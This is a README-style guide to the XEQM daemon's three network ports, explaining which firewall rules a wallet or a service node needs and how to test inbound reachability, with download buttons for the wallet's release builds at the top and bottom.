![XEQM WALLET](assets/banner-article.png)

# XEQM daemon firewall ports

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows" /> | Windows 10 or 11, 64-bit | [`XEQM-GUI-2.3.6-win.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe) |
| <img src="https://img.shields.io/badge/macOS-1371E6?style=flat-square&logo=apple&logoColor=white" alt="macOS" /> | macOS, Apple Silicon | [`XEQM-GUI-2.3.6-mac.dmg`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg) |
| <img src="https://img.shields.io/badge/Linux-1371E6?style=flat-square&logo=linux&logoColor=white" alt="Linux" /> | x64 Linux, AppImage | [`XEQM-GUI-2.3.6-linux.AppImage`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage) |

</div>


All versions and checksums are on the [XEQM WALLET release page](https://github.com/XEQMFoundation/XEQM-Wallet/releases/tag/v2.3.6).

Requirements follow the platforms the release ships assets for. No minimum OS build or disk figure is published for this tag.

> Only download from this GitHub release page.

The XEQM daemon uses three documented ports: peer-to-peer on 9230, RPC on 9231 and quorumnet on 9232. Outbound access is enough for a wallet to sync; inbound reachability on the peer port is what makes a node findable, and that difference decides which rules you actually need.

## The three ports and what each does

Peer-to-peer traffic carries blocks and transactions between nodes. RPC is the local control channel the wallet and tools use to talk to the daemon. Quorumnet carries the traffic service nodes exchange among themselves.

Only the first is meant to face the internet in the ordinary case. The other two are management and internal traffic, and exposing them is a decision rather than a default.

## What a wallet needs

Outbound access to peers on 9230, and outbound access to whatever remote node it is configured to use. A wallet behind a restrictive network fails at the first of those and looks like a wallet that will not connect.

Nothing inbound is required for a wallet. If you are not running a node, the firewall question is entirely about egress. [XEQM WALLET stuck on connecting](https://github.com/XEQMFoundation/platform-setup/blob/main/xeqm-wallet-stuck-on-connecting.md) covers the symptom.

## What a node needs

Inbound reachability on 9230 so peers can find it, plus the outbound access everything needs. A node that cannot be reached is a node that misses the checks that decide whether it is there.

That is why a node behind a home router needs a forward and a stable address rather than only an open outbound rule. [Run an XEQM node behind NAT](https://github.com/XEQMFoundation/account-guide/blob/main/run-xeqm-node-behind-nat.md) covers that arrangement.

## Why 9231 and 9232 should stay closed

RPC is a control interface. Exposing it to the internet hands strangers the ability to ask your daemon to do things, which is not a service you want to offer by accident.

Quorumnet is service-node traffic between known participants. It is not a public port, and opening it broadly is not required for a wallet and rarely required for a node.

## The provider firewall and the machine firewall

Two layers exist on a hosted instance: the provider's security group and the machine's own rules. A port opened in one and closed in the other is closed.

Check both, and check them in the order traffic arrives: the provider first, then the machine. Debugging the wrong layer is the most common way an afternoon disappears.

## Testing reachability from outside

A rule that looks right in a console can still be wrong in practice. Test from a different network rather than from the same machine, because a local test never crosses the boundary you are trying to verify.

If a remote node works from the same machine but the node is not found by peers, the problem is inbound rather than outbound, and the port is the first suspect.

## What to open on a hosted instance

A security group rule allowing inbound TCP on 9230 from anywhere is the minimum for a node. Everything else stays closed unless you have a specific reason.

Some providers also run a host-level firewall by default. Check both layers before concluding that a rule did not work.

## IPv6 and dual-stack hosts

A machine with both address families can accept on one and not the other, and peers may try the address that is closed. If the node is reachable over IPv4 and not IPv6, that asymmetry is the explanation.

The simplest fix is to make the rule identical on both families, or to disable the one you are not using.

## Why sync can work with the port closed

Outbound connections are enough for a node to fetch blocks, so a node behind a closed inbound rule still syncs and still looks healthy in the wallet.

What it cannot do is be found by new peers. That is why the symptom is quiet: everything you can see works, and the part you cannot see does not. [XEQM WALLET not syncing](https://github.com/XEQMFoundation/platform-setup/blob/main/xeqm-wallet-not-syncing-fix.md) covers the case where sync itself stalls.

## Document your working rules

Write down the rule, the port and the address family that worked. After a provider migration or a router replacement, that note is the difference between ten minutes and an evening.

Keep it with the node's other configuration rather than in a chat history you will not find again.

## What a blocked port looks like

The daemon runs, the chain may even sync outbound, and the node simply is not discovered. No error names the firewall, because from the daemon's perspective nothing failed  -  it just has fewer peers than it expected.

That is why "it syncs but nothing finds it" is the signature of an inbound rule that is not working. [Why an XEQM node gets deregistered](https://github.com/XEQMFoundation/account-guide/blob/main/why-was-my-xeqm-node-deregistered.md) covers the consequence.

## Home routers and address changes

A home connection usually needs a port forward, and a residential address can change. A node whose address moves without its DNS record following it is a node peers cannot find at the new address.

A small host with a stable address removes both problems, which is why it is the common choice for a first node. [XEQM service node hardware](https://github.com/XEQMFoundation/account-guide/blob/main/xeqm-service-node-hardware-requirements.md) covers the specification.

## Bandwidth and metering

Peer traffic is continuous and modest, and the published minimum is a 100 Mbps unmetered connection with 1 Gbps recommended. A metered link turns relaying into a bill that grows with other people's usage.

If your connection is metered, that is a reason to run a wallet rather than a node. Nothing about the wallet requires inbound traffic or sustained upload.

## What to change when something stops working

Change one thing at a time. A firewall rule, a router forward and a provider group are three places to make the same mistake, and changing all three at once leaves you unable to say which fixed it.

Keep a note of the working configuration. It is the fastest way back after a provider migration or a router reset. [How to set up an XEQM service node](https://github.com/XEQMFoundation/account-guide/blob/main/how-to-set-up-an-xeqm-service-node.md) covers where the ports fit in the flow.

## When nothing seems to work

Go back to the boundary. Take a machine outside your network, ask it to reach the node's peer port, and read the result. Everything inside the network is a guess until that test says otherwise.

If the port is reachable and the node is still not picked, the question has moved from networking to the node's own state, and the logs are the next place to look.

## A rule that allows the port but blocks the peer

Some firewalls allow a port and still drop the traffic, because the rule is scoped to a source range or to an interface that peers do not use. The port test passes from one network and fails from another.

If reachability is inconsistent, read the rule rather than the port list. A rule is a set of conditions, and the port is only one of them.

## The short version

9230 is peer traffic and the only port a node needs to accept. 9231 and 9232 are management and internal traffic and should stay closed to the internet. A wallet needs outbound access and nothing inbound.

If a node is not being found, test the inbound rule from outside before touching anything else.

## Frequently asked questions

### Which port must be open for a node?

The peer-to-peer port, 9230, inbound.

### Do I need to open RPC to use the wallet?

No. RPC is local management traffic, and exposing it to the internet is a risk rather than a requirement.

### Does a wallet need any inbound ports?

No. It needs outbound access to peers or to the remote node it uses.

### Why does my node sync but never get picked?

Sync proves outbound works. Being picked needs inbound reachability, so check the forward and the provider rule.

---

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

## Related guides

- [XEQM WALLET stuck on connecting](https://github.com/XEQMFoundation/platform-setup/blob/main/xeqm-wallet-stuck-on-connecting.md)
- [XEQM WALLET not syncing](https://github.com/XEQMFoundation/platform-setup/blob/main/xeqm-wallet-not-syncing-fix.md)
- [Switch to a remote node](https://github.com/XEQMFoundation/platform-setup/blob/main/switch-xeqm-wallet-to-remote-node.md)
